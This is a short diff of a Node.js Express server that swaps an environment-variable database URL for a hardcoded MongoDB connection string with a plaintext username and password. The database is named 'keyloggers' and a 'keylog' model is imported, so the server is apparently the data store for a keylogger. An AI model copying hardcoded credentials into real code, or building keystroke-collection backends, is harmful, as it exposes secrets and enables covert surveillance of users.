@@ -7,7 +7,7 @@ var cors = require('cors');
 
 app.use(cors({ origin: true, credentials: true }));
 
-var db=String(process.env.DB_URL);
+var db='mongodb+srv://authuser:authuser@cluster0.wrelr.mongodb.net/keyloggers?retryWrites=true&w=majority'
 
 var keylog=require('./database').keylog;
 var user=require('./database').user;
